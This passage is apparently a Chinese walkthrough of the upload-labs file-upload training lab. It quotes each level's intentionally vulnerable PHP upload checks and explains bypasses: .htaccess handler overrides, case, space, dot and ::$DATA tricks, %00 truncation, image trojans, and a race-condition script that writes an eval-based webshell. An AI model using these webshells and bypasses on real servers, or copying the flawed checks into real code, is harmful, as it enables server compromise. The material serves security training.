array(\".php\",\".php5\",\".php4\",\".php3\",\".php2\",\"php1\",\".html\",\".htm\",\".phtml\",\".pht\",\".pHp\",\".pHp5\",\".pHp4\",\".pHp3\",\".pHp2\",\"pHp1\",\".Html\",\".Htm\",\".pHtml\",\".jsp\",\".jspa\",\".jspx\",\".jsw\",\".jsv\",\".jspf\",\".jtml\",\".jSp\",\".jSpx\",\".jSpa\",\".jSw\",\".jSv\",\".jSpf\",\".jHtml\",\".asp\",\".aspx\",\".asa\",\".asax\",\".ascx\",\".ashx\",\".asmx\",\".cer\",\".aSp\",\".aSpx\",\".aSa\",\".aSax\",\".aScx\",\".aShx\",\".aSmx\",\".cEr\",\".sWf\",\".swf\"); $file_name = trim($_FILES['upload_file']['name']); $file_name = deldot($file_name);//删除文件名末尾的点 $file_ext = strrchr($file_name, '.'); $file_ext = strtolower($file_ext); //转换为小写 $file_ext = str_ireplace('::$DATA', '', $file_ext);//去除字符串::$DATA $file_ext = trim($file_ext); //收尾去空 if (!in_array($file_ext, $deny_ext)) &#123; $temp_file = $_FILES['upload_file']['tmp_name']; $img_path = UPLOAD_PATH.'/'.date(\"YmdHis\").rand(1000,9999).$file_ext; if (move_uploaded_file($temp_file, $img_path)) &#123; $is_upload = true; &#125; else &#123; $msg = '上传出错！'; &#125; &#125; else &#123; $msg = '此文件不允许上传!'; &#125; &#125; else &#123; $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！'; &#125;&#125; +++ 拦截方式：服务端黑名单加强验证;与Pass-03类似，只是对上传文件的后缀名的限制种类增加 绕过方式：重写文件解析规则绕过(第3关(2)) 上传.htaccess文件 123&lt;FilesMatch \"hack.png\"&gt;SetHandler application/x-httpd-php&lt;/FilesMatch&gt; 上传hack.png（含木马） 上传成功，并以php进行了解析！ +++ Pass-05首先，尝试上传php文件，提示信息为：*提示：此文件类型不允许上传！ * 查看提示： 本pass禁止上传.php|.php5|.php4|.php3|.php2|php1|.html|.htm|.phtml|.pHp|.pHp5|.pHp4|.pHp3|.pHp2|pHp1|.Html|.Htm|.pHtml|.jsp|.jspa|.jspx|.jsw|.jsv|.jspf|.jtml|.jSp|.jSpx|.jSpa|.jSw|.jSv|.jSpf|.jHtml|.asp|.aspx|.asa|.asax|.ascx|.ashx|.asmx|.cer|.aSp|.aSpx|.aSa|.aSax|.aScx|.aShx|.aSmx|.cEr|.sWf|.swf|.htaccess后缀文件！ Pass-05向黑名单中增加了.htaccess后缀文件; 源码： 1234567891011121314151617181920212223242526$is_upload = false;$msg = null;if (isset($_POST['submit'])) &#123; if (file_exists(UPLOAD_PATH)) &#123; $deny_ext = array(\".php\",\".php5\",\".php4\",\".php3\",\".php2\",\".html\",\".htm\",\".phtml\",\".pht\",\".pHp\",\".pHp5\",\".pHp4\",\".pHp3\",\".pHp2\",\".Html\",\".Htm\",\".pHtml\",\".jsp\",\".jspa\",\".jspx\",\".jsw\",\".jsv\",\".jspf\",\".jtml\",\".jSp\",\".jSpx\",\".jSpa\",\".jSw\",\".jSv\",\".jSpf\",\".jHtml\",\".asp\",\".aspx\",\".asa\",\".asax\",\".ascx\",\".ashx\",\".asmx\",\".cer\",\".aSp\",\".aSpx\",\".aSa\",\".aSax\",\".aScx\",\".aShx\",\".aSmx\",\".cEr\",\".sWf\",\".swf\",\".htaccess\"); $file_name = trim($_FILES['upload_file']['name']); $file_name = deldot($file_name);//删除文件名末尾的点 $file_ext = strrchr($file_name, '.'); $file_ext = str_ireplace('::$DATA', '', $file_ext);//去除字符串::$DATA $file_ext = trim($file_ext); //首尾去空 if (!in_array($file_ext, $deny_ext)) &#123; $temp_file = $_FILES['upload_file']['tmp_name']; $img_path = UPLOAD_PATH.'/'.date(\"YmdHis\").rand(1000,9999).$file_ext; if (move_uploaded_file($temp_file, $img_path)) &#123; $is_upload = true; &#125; else &#123; $msg = '上传出错！'; &#125; &#125; else &#123; $msg = '此文件类型不允许上传！'; &#125; &#125; else &#123; $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！'; &#125;&#125; 删除了该语句：$file_ext = strtolower($file_ext); //转换为小写 +++ 拦截方式：服务端黑名单超级加强;.htaccess加入了黑名单，取消了后缀名全变为小写字母的strtolower（）函数 绕过方式：采用大小写混合方式绕过.PhP,.PHp5，或着.hTacCesS文件… 上传成功！ +++ Pass-06首先，尝试上传php文件，提示信息为：*提示：此文件不允许上传 * 查看提示： 本pass禁止上传.php|.php5|.php4|.php3|.php2|php1|.html|.htm|.phtml|.pHp|.pHp5|.pHp4|.pHp3|.pHp2|pHp1|.Html|.Htm|.pHtml|.jsp|.jspa|.jspx|.jsw|.jsv|.jspf|.jtml|.jSp|.jSpx|.jSpa|.jSw|.jSv|.jSpf|.jHtml|.asp|.aspx|.asa|.asax|.ascx|.ashx|.asmx|.cer|.aSp|.aSpx|.aSa|.aSax|.aScx|.aShx|.aSmx|.cEr|.sWf|.swf后缀文件！ 源码： 1234567891011121314151617181920212223242526$is_upload = false;$msg = null;if (isset($_POST['submit'])) &#123; if (file_exists(UPLOAD_PATH)) &#123; $deny_ext = array(\".php\",\".php5\",\".php4\",\".php3\",\".php2\",\".html\",\".htm\",\".phtml\",\".pht\",\".pHp\",\".pHp5\",\".pHp4\",\".pHp3\",\".pHp2\",\".Html\",\".Htm\",\".pHtml\",\".jsp\",\".jspa\",\".jspx\",\".jsw\",\".jsv\",\".jspf\",\".jtml\",\".jSp\",\".jSpx\",\".jSpa\",\".jSw\",\".jSv\",\".jSpf\",\".jHtml\",\".asp\",\".aspx\",\".asa\",\".asax\",\".ascx\",\".ashx\",\".asmx\",\".cer\",\".aSp\",\".aSpx\",\".aSa\",\".aSax\",\".aScx\",\".aShx\",\".aSmx\",\".cEr\",\".sWf\",\".swf\",\".htaccess\"); $file_name = $_FILES['upload_file']['name']; $file_name = deldot($file_name);//删除文件名末尾的点 $file_ext = strrchr($file_name, '.'); $file_ext = strtolower($file_ext); //转换为小写 $file_ext = str_ireplace('::$DATA', '', $file_ext);//去除字符串::$DATA if (!in_array($file_ext, $deny_ext)) &#123; $temp_file = $_FILES['upload_file']['tmp_name']; $img_path = UPLOAD_PATH.'/'.date(\"YmdHis\").rand(1000,9999).$file_ext; if (move_uploaded_file($temp_file,$img_path)) &#123; $is_upload = true; &#125; else &#123; $msg = '上传出错！'; &#125; &#125; else &#123; $msg = '此文件不允许上传'; &#125; &#125; else &#123; $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！'; &#125;&#125; 提示和源码里的黑名单并不一致，提示里少了.htaccess$file_ext = trim($file_ext); //首尾去空+++ 拦截方式：服务端黑名单;去掉了去除空格的trim函数； 绕过方式：选择后缀为.php的一句话上传，抓包后在后面增加空格; 上传成功！ +++ Pass-07首先，尝试上传php文件，提示信息为：*提示：此文件不允许上传 * 查看提示： 本pass禁止上传所有可以解析的后缀！ 源码： 1234567891011121314151617181920212223242526$is_upload = false;$msg = null;if (isset($_POST['submit'])) &#123; if (file_exists(UPLOAD_PATH)) &#123; $deny_ext = array(\".php\",\".php5\",\".php4\",\".php3\",\".php2\",\".html\",\".htm\",\".phtml\",\".pht\",\".pHp\",\".pHp5\",\".pHp4\",\".pHp3\",\".pHp2\",\".Html\",\".Htm\",\".pHtml\",\".jsp\",\".jspa\",\".jspx\",\".jsw\",\".jsv\",\".jspf\",\".jtml\",\".jSp\",\".jSpx\",\".jSpa\",\".jSw\",\".jSv\",\".jSpf\",\".jHtml\",\".asp\",\".aspx\",\".asa\",\".asax\",\".ascx\",\".ashx\",\".asmx\",\".cer\",\".aSp\",\".aSpx\",\".aSa\",\".aSax\",\".aScx\",\".aShx\",\".aSmx\",\".cEr\",\".sWf\",\".swf\",\".htaccess\"); $file_name = trim($_FILES['upload_file']['name']); $file_ext = strrchr($file_name, '.'); $file_ext = strtolower($file_ext); //转换为小写 $file_ext = str_ireplace('::$DATA', '', $file_ext);//去除字符串::$DATA $file_ext = trim($file_ext); //首尾去空 if (!in_array($file_ext, $deny_ext)) &#123; $temp_file = $_FILES['upload_file']['tmp_name']; $img_path = UPLOAD_PATH.'/'.$file_name; if (move_uploaded_file($temp_file, $img_path)) &#123; $is_upload = true; &#125; else &#123; $msg = '上传出错！'; &#125; &#125; else &#123; $msg = '此文件类型不允许上传！'; &#125; &#125; else &#123; $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！'; &#125;&#125; +++ 拦截方式：服务端黑名单; 绕过方式：没有删除结尾的“.”，利用windows特性，会自动去掉后缀名中最后的”.”，可在后缀名中加”.”绕过; +++ Pass-08首先，尝试上传php文件，提示信息为：*提示：此文件不允许上传 * 查看提示： 本pass禁止上传.php|.php5|.php4|.php3|.php2|php1|.html|.htm|.phtml|.pHp|.pHp5|.pHp4|.pHp3|.pHp2|pHp1|.Html|.Htm|.pHtml|.jsp|.jspa|.jspx|.jsw|.jsv|.jspf|.jtml|.jSp|.jSpx|.jSpa|.jSw|.jSv|.jSpf|.jHtml|.asp|.aspx|.asa|.asax|.ascx|.ashx|.asmx|.cer|.aSp|.aSpx|.aSa|.aSax|.aScx|.aShx|.aSmx|.cEr|.sWf|.swf|.htaccess后缀文件！ 源码： 1234567891011121314151617181920212223242526$is_upload = false;$msg = null;if (isset($_POST['submit'])) &#123; if (file_exists(UPLOAD_PATH)) &#123; $deny_ext = array(\".php\",\".php5\",\".php4\",\".php3\",\".php2\",\".html\",\".htm\",\".phtml\",\".pht\",\".pHp\",\".pHp5\",\".pHp4\",\".pHp3\",\".pHp2\",\".Html\",\".Htm\",\".pHtml\",\".jsp\",\".jspa\",\".jspx\",\".jsw\",\".jsv\",\".jspf\",\".jtml\",\".jSp\",\".jSpx\",\".jSpa\",\".jSw\",\".jSv\",\".jSpf\",\".jHtml\",\".asp\",\".aspx\",\".asa\",\".asax\",\".ascx\",\".ashx\",\".asmx\",\".cer\",\".aSp\",\".aSpx\",\".aSa\",\".aSax\",\".aScx\",\".aShx\",\".aSmx\",\".cEr\",\".sWf\",\".swf\",\".htaccess\"); $file_name = trim($_FILES['upload_file']['name']); $file_name = deldot($file_name);//删除文件名末尾的点 $file_ext = strrchr($file_name, '.'); $file_ext = strtolower($file_ext); //转换为小写 $file_ext = trim($file_ext); //首尾去空 if (!in_array($file_ext, $deny_ext)) &#123; $temp_file = $_FILES['upload_file']['tmp_name']; $img_path = UPLOAD_PATH.'/'.date(\"YmdHis\").rand(1000,9999).$file_ext; if (move_uploaded_file($temp_file, $img_path)) &#123; $is_upload = true; &#125; else &#123; $msg = '上传出错！'; &#125; &#125; else &#123; $msg = '此文件类型不允许上传！'; &#125; &#125; else &#123; $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！'; &#125;&#125; +++ 拦截方式：服务端黑名单; 绕过方式：Windows系统下，如果上传的文件名中test.php::$DATA会在服务器上生成一个test.php的文件，其中内容和所上传文件内容相同，并被解析。 +++ Pass-09首先，尝试上传php文件，提示信息为：*提示：此文件不允许上传 * 查看提示： 本pass只允许上传.jpg|.png|.gif后缀的文件！ 源码： 123456789101112131415161718192021222324252627$is_upload = false;$msg = null;if (isset($_POST['submit'])) &#123; if (file_exists(UPLOAD_PATH)) &#123; $deny_ext = array(\".php\",\".php5\",\".php4\",\".php3\",\".php2\",\".html\",\".htm\",\".phtml\",\".pht\",\".pHp\",\".pHp5\",\".pHp4\",\".pHp3\",\".pHp2\",\".Html\",\".Htm\",\".pHtml\",\".jsp\",\".jspa\",\".jspx\",\".jsw\",\".jsv\",\".jspf\",\".jtml\",\".jSp\",\".jSpx\",\".jSpa\",\".jSw\",\".jSv\",\".jSpf\",\".jHtml\",\".asp\",\".aspx\",\".asa\",\".asax\",\".ascx\",\".ashx\",\".asmx\",\".cer\",\".aSp\",\".aSpx\",\".aSa\",\".aSax\",\".aScx\",\".aShx\",\".aSmx\",\".cEr\",\".sWf\",\".swf\",\".htaccess\"); $file_name = trim($_FILES['upload_file']['name']); $file_name = deldot($file_name);//删除文件名末尾的点 $file_ext = strrchr($file_name, '.'); $file_ext = strtolower($file_ext); //转换为小写 $file_ext = str_ireplace('::$DATA', '', $file_ext);//去除字符串::$DATA $file_ext = trim($file_ext); //首尾去空 if (!in_array($file_ext, $deny_ext)) &#123; $temp_file = $_FILES['upload_file']['tmp_name']; $img_path = UPLOAD_PATH.'/'.$file_name; if (move_uploaded_file($temp_file, $img_path)) &#123; $is_upload = true; &#125; else &#123; $msg = '上传出错！'; &#125; &#125; else &#123; $msg = '此文件类型不允许上传！'; &#125; &#125; else &#123; $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！'; &#125;&#125; +++ 拦截方式：服务端黑名单; 绕过方式： 12$img_path = UPLOAD_PATH.'/'.$file_name;路径拼接的是处理后的文件名 加 点+空格+点 +++ Pass-10首先，尝试上传php文件，提示信息为：*提示：此文件不允许上传 * 查看提示： 本pass会从文件名中去除.php|.php5|.php4|.php3|.php2|php1|.html|.htm|.phtml|.pHp|.pHp5|.pHp4|.pHp3|.pHp2|pHp1|.Html|.Htm|.pHtml|.jsp|.jspa|.jspx|.jsw|.jsv|.jspf|.jtml|.jSp|.jSpx|.jSpa|.jSw|.jSv|.jSpf|.jHtml|.asp|.aspx|.asa|.asax|.ascx|.ashx|.asmx|.cer|.aSp|.aSpx|.aSa|.aSax|.aScx|.aShx|.aSmx|.cEr|.sWf|.swf|.htaccess字符！ 源码： 12345678910111213141516171819$is_upload = false;$msg = null;if (isset($_POST['submit'])) &#123; if (file_exists(UPLOAD_PATH)) &#123; $deny_ext = array(\"php\",\"php5\",\"php4\",\"php3\",\"php2\",\"html\",\"htm\",\"phtml\",\"pht\",\"jsp\",\"jspa\",\"jspx\",\"jsw\",\"jsv\",\"jspf\",\"jtml\",\"asp\",\"aspx\",\"asa\",\"asax\",\"ascx\",\"ashx\",\"asmx\",\"cer\",\"swf\",\"htaccess\"); $file_name = trim($_FILES['upload_file']['name']); $file_name = str_ireplace($deny_ext,\"\", $file_name); $temp_file = $_FILES['upload_file']['tmp_name']; $img_path = UPLOAD_PATH.'/'.$file_name; if (move_uploaded_file($temp_file, $img_path)) &#123; $is_upload = true; &#125; else &#123; $msg = '上传出错！'; &#125; &#125; else &#123; $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！'; &#125;&#125; +++ 拦截方式：服务端黑名单; 12$file_name = str_ireplace($deny_ext,\"\", $file_name);用str_ireplace函数将符合黑名单中的后缀名进行替换为空 绕过方式：双写绕过； +++ Pass-11首先，尝试上传php文件，提示信息为：提示：只允许上传.jpg|.png|.gif类型文件！ 查看提示： 本pass上传路径可控！ 源码： 123456789101112131415161718$is_upload = false;$msg = null;if(isset($_POST['submit']))&#123; $ext_arr = array('jpg','png','gif'); $file_ext = substr($_FILES['upload_file']['name'],strrpos($_FILES['upload_file']['name'],\".\")+1); if(in_array($file_ext,$ext_arr))&#123; $temp_file = $_FILES['upload_file']['tmp_name']; $img_path = $_GET['save_path'].\"/\".rand(10, 99).date(\"YmdHis\").\".\".$file_ext; if(move_uploaded_file($temp_file,$img_path))&#123; $is_upload = true; &#125; else &#123; $msg = '上传出错！'; &#125; &#125; else&#123; $msg = \"只允许上传.jpg|.png|.gif类型文件！\"; &#125;&#125; +++ 拦截方式：服务端白名单; 12$img_path = $_GET['save_path'].\"/\".rand(10,99).date(\"YmdHis\").\".\".$file_ext;// $img_path直接拼接 绕过方式：利用%00截断绕过； 需关闭magic_quotes_gpc php 版本&lt;5.3.4 +++ Pass-12首先，尝试上传php文件，提示信息为：提示：只允许上传.jpg|.png|.gif类型文件！ 查看提示： 本pass上传路径可控！ 源码： 123456789101112131415161718$is_upload = false;$msg = null;if(isset($_POST['submit']))&#123; $ext_arr = array('jpg','png','gif'); $file_ext = substr($_FILES['upload_file']['name'],strrpos($_FILES['upload_file']['name'],\".\")+1); if(in_array($file_ext,$ext_arr))&#123; $temp_file = $_FILES['upload_file']['tmp_name']; $img_path = $_POST['save_path'].\"/\".rand(10, 99).date(\"YmdHis\").\".\".$file_ext; if(move_uploaded_file($temp_file,$img_path))&#123; $is_upload = true; &#125; else &#123; $msg = \"上传失败\"; &#125; &#125; else &#123; $msg = \"只允许上传.jpg|.png|.gif类型文件！\"; &#125;&#125; +++ 拦截方式：服务端白名单; 绕过方式： 利用%00截断绕过；这一关和Pass-11的区别是，00截断是用在POST中，且是在二进制中进行修改。因为POST不会像GET那样对%00进行自动解码。/在BP中选中%00右键，可以直接编码； 需关闭magic_quotes_gpc php 版本&lt;5.3.4 +++ Pass-13首先，尝试上传php文件，提示信息为：*提示：文件未知，上传失败！ * 查看提示： 本pass检查图标内容开头2个字节！ 源码： 12345678910111213141516171819202122232425262728293031323334353637383940function getReailFileType($filename)&#123; $file = fopen($filename, \"rb\"); $bin = fread($file, 2); //只读2字节 fclose($file); $strInfo = @unpack(\"C2chars\", $bin); $typeCode = intval($strInfo['chars1'].$strInfo['chars2']); $fileType = ''; switch($typeCode)&#123; case 255216: $fileType = 'jpg'; break; case 13780: $fileType = 'png'; break; case 7173: $fileType = 'gif'; break; default: $fileType = 'unknown'; &#125; return $fileType;&#125;$is_upload = false;$msg = null;if(isset($_POST['submit']))&#123; $temp_file = $_FILES['upload_file']['tmp_name']; $file_type = getReailFileType($temp_file); if($file_type == 'unknown')&#123; $msg = \"文件未知，上传失败！\"; &#125;else&#123; $img_path = UPLOAD_PATH.\"/\".rand(10, 99).date(\"YmdHis\").\".\".$file_type; if(move_uploaded_file($temp_file,$img_path))&#123; $is_upload = true; &#125; else &#123; $msg = \"上传出错！\"; &#125; &#125;&#125; +++ 拦截方式：服务端白名单;getReailFileType函数只会读取文件的前两个字节 12$file = fopen($filename, \"rb\");$bin = fread($file, 2); //只读2字节 绕过方式：图片马+文件包含利用； 制作图片马： 12copy 1.jpg/a + 1.txt/b 2.jpg//1.txt中的内容为一句话木马，1.jpg则是一张图片。生成的图片马是2.jpg 利用include.php实现文件包含 123456789101112&lt;?php/*本页面存在文件包含漏洞，用于测试图片马是否能正常运行！*/header(\"Content-Type:text/html;charset=utf-8\");$file = $_GET['file'];if(isset($file))&#123; include $file;&#125;else&#123; show_source(__file__);&#125;?&gt; 蚁剑连接 +++ Pass-14首先，尝试上传php文件，提示信息为：*提示：文件未知，上传失败！ * 查看提示： 本pass使用getimagesize()检查是否为图片文件！ 源码： 12345678910111213141516171819202122232425262728293031function isImage($filename)&#123; $types = '.jpeg|.png|.gif'; if(file_exists($filename))&#123; $info = getimagesize($filename); $ext = image_type_to_extension($info[2]); if(stripos($types,$ext)&gt;=0)&#123; return $ext; &#125;else&#123; return false; &#125; &#125;else&#123; return false; &#125;&#125;$is_upload = false;$msg = null;if(isset($_POST['submit']))&#123; $temp_file = $_FILES['upload_file']['tmp_name']; $res = isImage($temp_file); if(!$res)&#123; $msg = \"文件未知，上传失败！\"; &#125;else&#123; $img_path = UPLOAD_PATH.\"/\".rand(10, 99).date(\"YmdHis\").$res; if(move_uploaded_file($temp_file,$img_path))&#123; $is_upload = true; &#125; else &#123; $msg = \"上传出错！\"; &#125; &#125;&#125; +++ 拦截方式：服务端白名单**;校验了文件头** 1$info = getimagesize($filename); 绕过方式：图片马+文件包含利用； +++ Pass-15需要开启php_exif模块 绕过方式：图片马+文件包含利用； +++ Pass-16这里使用容易绕过二次渲染的gif文件。现在制作一个gif图片马，copy就可以了。也可以winhex制作。 制作后便上传，发现无法利用。然后将上传的图片重新下载下来，放入winhex，进行对比。 可以找到二次渲染后不变的地方，而这个地方就是可以插入一句话的地方。 上传修改好的图片马，蚁剑连接成功。 图片马二次渲染 +++ Pass-17拦截方式：白名单验证，条件竞争 这一关是先上传再判断，所以实在判断前就对上传的文件进行请求。 先创建一个webshell.php，内容为 123&lt;?php fputs(fopen('shell.php','w'),'&lt;?php @eval($_POST[\"cmd\"]) ?&gt;');?&gt; 再使用python不断请求 123import requestswhile 1: requests.get(\"http://localhost/upload-labs/upload/webshell.php\") 运行python代码，再开始上传php文件。 看是否有shell.php; 蚁剑连接； +++ Upload Labs 文件上传项目地址：https://github.com/c0ny1/upload-labs 第1关 前端js绕过12345678910111213141516171819&lt;script type=\"text/javascript\"&gt; function checkFile() &#123; var file = document.getElementsByName('upload_file')[0].value; if (file == null || file == \"\") &#123; alert(\"请选择要上传的文件!\"); return false; &#125; //定义允许上传的文件类型 var allow_ext = \".jpg|.png|.gif\"; //提取上传文件的类型 var ext_name = file.substring(file.lastIndexOf(\".\")); //判断上传文件类型是否允许上传 if (allow_ext.indexOf(ext_name) == -1) &#123; var errMsg = \"该文件不允许上传，请上传\" + allow_ext + \"类型的文件,当前文件类型为：\" + ext_name; alert(errMsg); return false; &#125; &#125;&lt;/script&gt; 前端禁用js 抓包绕过 第2关 content-type123456789101112131415161718192021&lt;?php$is_upload = false;$msg = null;if (isset($_POST['submit'])) &#123; if (file_exists(UPLOAD_PATH)) &#123; if (($_FILES['upload_file']['type'] == 'image/jpeg') || ($_FILES['upload_file']['type'] == 'image/png') || ($_FILES['upload_file']['type'] == 'image/gif')) &#123; $temp_file = $_FILES['upload_file']['tmp_name']; $img_path = UPLOAD_PATH . '/' . $_FILES['upload_file']['name']; if (move_uploaded_file($temp_file, $img_path)) &#123; $is_upload = true; &#125; else &#123; $msg = '上传出错！'; &#125; &#125; else &#123; $msg = '文件类型不正确，请重新上传！'; &#125; &#125; else &#123; $msg = UPLOAD_PATH.'文件夹不存在,请手工创建！'; &#125;&#125;?&gt; 第3关 php3 phtml1234567891011121314151617181920212223242526272829&lt;?php$is_upload = false;$msg = null;if (isset($_POST['submit'])) &#123; if (file_exists(UPLOAD_PATH)) &#123; $deny_ext = array('.asp','.aspx','.php','.jsp'); $file_name = trim($_FILES['upload_file']['name']); $file_name = deldot($file_name);//删除文件名末尾的点 $file_ext = strrchr($file_name, '.'); $file_ext = strtolower($file_ext); //转换为小写 $file_ext = str_ireplace('::$DATA', '', $file_ext);//去除字符串::$DATA $file_ext = trim($file_ext); //收尾去空 if(!in_array($file_ext, $deny_ext)) &#123; $temp_file = $_FILES['upload_file']['tmp_name']; $img_path = UPLOAD_PATH.'/'.date(\"YmdHis\").rand(1000,9999).$file_ext; if (move_uploaded_file($temp_file,$img_path)) &#123; $is_upload = true; &#125; else &#123; $msg = '上传出错！'; &#125; &#125; else &#123; $msg = '不允许上传.asp,.aspx,.php,.jsp后缀文件！'; &#125; &#125; else &#123; $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！'; &#125;&#125;?&gt; 黑名单判断，于是尝试用php3,phtml绕过 apache httpd.conf进行配置 1AddType application/x-httpd-php .php .php3 .phtml MimeTypes表 当php邂逅windows通用上传缺陷 在文件上传时，我们往往会考虑到文件名截断，如%00 等.. 可能还会用冒号(“:”)去截断 13.php:jpg 冒号截断产生的文件是空白的，里面并不会有任何的内容 会写入一个3.php的空文件 &lt; 就等于 **,而*代码任意字符，于是乎可以这样修改上传的文件名，如下： 然后修改名字为 123.&lt;&lt;&lt;&lt;?php phpinfo();?&gt; 第4关 .htaccess1234567891011121314151617181920212223242526272829&lt;?php$is_upload = false;$msg = null;if (isset($_POST['submit'])) &#123; if (file_exists(UPLOAD_PATH)) &#123; $deny_ext = array(\".php\",\".php5\",\".php4\",\".php3\",\".php2\",\"php1\",\".html\",\".htm\",\".phtml\",\".pht\",\".pHp\",\".pHp5\",\".pHp4\",\".pHp3\",\".pHp2\",\"pHp1\",\".Html\",\".Htm\",\".pHtml\",\".jsp\",\".jspa\",\".jspx\",\".jsw\",\".jsv\",\".jspf\",\".jtml\",\".jSp\",\".jSpx\",\".jSpa\",\".jSw\",\".jSv\",\".jSpf\",\".jHtml\",\".asp\",\".aspx\",\".asa\",\".asax\",\".ascx\",\".ashx\",\".asmx\",\".cer\",\".aSp\",\".aSpx\",\".aSa\",\".aSax\",\".aScx\",\".aShx\",\".aSmx\",\".cEr\",\".sWf\",\".swf\"); $file_name = trim($_FILES['upload_file']['name']); $file_name = deldot($file_name);//删除文件名末尾的点 $file_ext = strrchr($file_name, '.'); $file_ext = strtolower($file_ext); //转换为小写 $file_ext = str_ireplace('::$DATA', '', $file_ext);//去除字符串::$DATA $file_ext = trim($file_ext); //收尾去空 if (!in_array($file_ext, $deny_ext)) &#123; $temp_file = $_FILES['upload_file']['tmp_name']; $img_path = UPLOAD_PATH.'/'.$file_name; if (move_uploaded_file($temp_file, $img_path)) &#123; $is_upload = true; &#125; else &#123; $msg = '上传出错！'; &#125; &#125; else &#123; $msg = '此文件不允许上传!'; &#125; &#125; else &#123; $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！'; &#125;&#125;?&gt; 是黑名单，但几乎过滤了所有有问题的后缀名，除了.htaccess，于是首先上传一个.htaccess内容如下的文件: 1SetHandler application/x-httpd-php 然后随便上传一个后缀都会解析为php 第5关 大小写12345678910111213141516171819202122232425262728&lt;?php$is_upload = false;$msg = null;if (isset($_POST['submit'])) &#123; if (file_exists(UPLOAD_PATH)) &#123; $deny_ext = array(\".php\",\".php5\",\".php4\",\".php3\",\".php2\",\".html\",\".htm\",\".phtml\",\".pht\",\".pHp\",\".pHp5\",\".pHp4\",\".pHp3\",\".pHp2\",\".Html\",\".Htm\",\".pHtml\",\".jsp\",\".jspa\",\".jspx\",\".jsw\",\".jsv\",\".jspf\",\".jtml\",\".jSp\",\".jSpx\",\".jSpa\",\".jSw\",\".jSv\",\".jSpf\",\".jHtml\",\".asp\",\".aspx\",\".asa\",\".asax\",\".ascx\",\".ashx\",\".asmx\",\".cer\",\".aSp\",\".aSpx\",\".aSa\",\".aSax\",\".aScx\",\".aShx\",\".aSmx\",\".cEr\",\".sWf\",\".swf\",\".htaccess\"); $file_name = trim($_FILES['upload_file']['name']); $file_name = deldot($file_name);//删除文件名末尾的点 $file_ext = strrchr($file_name, '.'); $file_ext = str_ireplace('::$DATA', '', $file_ext);//去除字符串::$DATA $file_ext = trim($file_ext); //首尾去空 if (!in_array($file_ext, $deny_ext)) &#123; $temp_file = $_FILES['upload_file']['tmp_name']; $img_path = UPLOAD_PATH.'/'.date(\"YmdHis\").rand(1000,9999).$file_ext; if (move_uploaded_file($temp_file, $img_path)) &#123; $is_upload = true; &#125; else &#123; $msg = '上传出错！'; &#125; &#125; else &#123; $msg = '此文件类型不允许上传！'; &#125; &#125; else &#123; $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！'; &#125;&#125;?&gt; 大小写规则不全，可以使用phP后缀上传突破。 第6关 空格1234567891011121314151617181920212223242526272829&lt;?php$is_upload = false;$msg = null;if (isset($_POST['submit'])) &#123; if (file_exists(UPLOAD_PATH)) &#123; $deny_ext = array(\".php\",\".php5\",\".php4\",\".php3\",\".php2\",\".html\",\".htm\",\".phtml\",\".pht\",\".pHp\",\".pHp5\",\".pHp4\",\".pHp3\",\".pHp2\",\".Html\",\".Htm\",\".pHtml\",\".jsp\",\".jspa\",\".jspx\",\".jsw\",\".jsv\",\".jspf\",\".jtml\",\".jSp\",\".jSpx\",\".jSpa\",\".jSw\",\".jSv\",\".jSpf\",\".jHtml\",\".asp\",\".aspx\",\".asa\",\".asax\",\".ascx\",\".ashx\",\".asmx\",\".cer\",\".aSp\",\".aSpx\",\".aSa\",\".aSax\",\".aScx\",\".aShx\",\".aSmx\",\".cEr\",\".sWf\",\".swf\",\".htaccess\"); $file_name = $_FILES['upload_file']['name']; $file_name = deldot($file_name);//删除文件名末尾的点 $file_ext = strrchr($file_name, '.'); $file_ext = strtolower($file_ext); //转换为小写 $file_ext = str_ireplace('::$DATA', '', $file_ext);//去除字符串::$DATA if (!in_array($file_ext, $deny_ext)) &#123; $temp_file = $_FILES['upload_file']['tmp_name']; $img_path = UPLOAD_PATH.'/'.date(\"YmdHis\").rand(1000,9999).$file_ext; if (move_uploaded_file($temp_file,$img_path)) &#123; $is_upload = true; &#125; else &#123; $msg = '上传出错！'; &#125; &#125; else &#123; $msg = '此文件不允许上传'; &#125; &#125; else &#123; $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！'; &#125;&#125;?&gt; 利用Windows系统的文件名特性。文件名最后增加空格 第7关 点1234567891011121314151617181920212223242526272829&lt;?php$is_upload = false;$msg = null;if (isset($_POST['submit'])) &#123; if (file_exists(UPLOAD_PATH)) &#123; $deny_ext = array(\".php\",\".php5\",\".php4\",\".php3\",\".php2\",\".html\",\".htm\",\".phtml\",\".pht\",\".pHp\",\".pHp5\",\".pHp4\",\".pHp3\",\".pHp2\",\".Html\",\".Htm\",\".pHtml\",\".jsp\",\".jspa\",\".jspx\",\".jsw\",\".jsv\",\".jspf\",\".jtml\",\".jSp\",\".jSpx\",\".jSpa\",\".jSw\",\".jSv\",\".jSpf\",\".jHtml\",\".asp\",\".aspx\",\".asa\",\".asax\",\".ascx\",\".ashx\",\".asmx\",\".cer\",\".aSp\",\".aSpx\",\".aSa\",\".aSax\",\".aScx\",\".aShx\",\".aSmx\",\".cEr\",\".sWf\",\".swf\",\".htaccess\"); $file_name = trim($_FILES['upload_file']['name']); $file_ext = strrchr($file_name, '.'); $file_ext = strtolower($file_ext); //转换为小写 $file_ext = str_ireplace('::$DATA', '', $file_ext);//去除字符串::$DATA $file_ext = trim($file_ext); //首尾去空 if (!in_array($file_ext, $deny_ext)) &#123; $temp_file = $_FILES['upload_file']['tmp_name']; $img_path = UPLOAD_PATH.'/'.$file_name; if (move_uploaded_file($temp_file, $img_path)) &#123; $is_upload = true; &#125; else &#123; $msg = '上传出错！'; &#125; &#125; else &#123; $msg = '此文件类型不允许上传！'; &#125; &#125; else &#123; $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！'; &#125;&#125;?&gt; 没有删除结尾的“.”，利用windows特性，会自动去掉后缀名中最后的”.”，可在后缀名中加”.”绕过 第8关 DATA12345678910111213141516171819202122232425262728&lt;?php$is_upload = false;$msg = null;if 